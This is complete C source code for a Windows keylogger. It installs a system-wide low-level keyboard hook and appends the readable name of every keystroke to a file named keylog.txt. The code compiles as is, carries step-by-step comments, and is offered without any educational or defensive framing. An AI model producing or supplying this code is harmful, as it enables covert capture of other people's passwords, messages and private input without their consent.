

#include <windows.h>
#include <stdio.h>

// Global hook handle and log file pointer
HHOOK hKeyHook;
FILE *logFile;

// Callback function for low-level keyboard events
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Process the event only if nCode is HC_ACTION
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;

        // Check if a key is pressed (not released)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            DWORD vkCode = pKeyBoard->vkCode;
            char keyName[32] = {0};

            // Use GetKeyNameText to translate the scan code to a readable name
            // Shift the scan code into the proper position for GetKeyNameText
            LONG lParamValue = pKeyBoard->scanCode << 16;
            // For extended keys, set the extended bit (0x01000000)
            if (pKeyBoard->flags & LLKHF_EXTENDED)
                lParamValue |= 0x01000000;
            
            GetKeyNameText(lParamValue, keyName, sizeof(keyName));

            // Write the key name to the log file (append a space for readability)
            if (logFile != NULL) {
                fprintf(logFile, "%s ", keyName);
                fflush(logFile);
            }
        }
    }
    // Call the next hook in the chain
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

int main() {
    // Open the log file in append mode
    logFile = fopen("keylog.txt", "a");
    if (logFile == NULL) {
        MessageBox(NULL, "Unable to open log file!", "Error", MB_ICONERROR);
        return 1;
    }

    // Get the current module handle
    HINSTANCE hInstance = GetModuleHandle(NULL);
    // Install the low-level keyboard hook
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
    if (hKeyHook == NULL) {
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
        fclose(logFile);
        return 1;
    }

    // Message loop to keep the hook alive
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup: unhook and close the log file
    UnhookWindowsHookEx(hKeyHook);
    fclose(logFile);
    return 0;
}
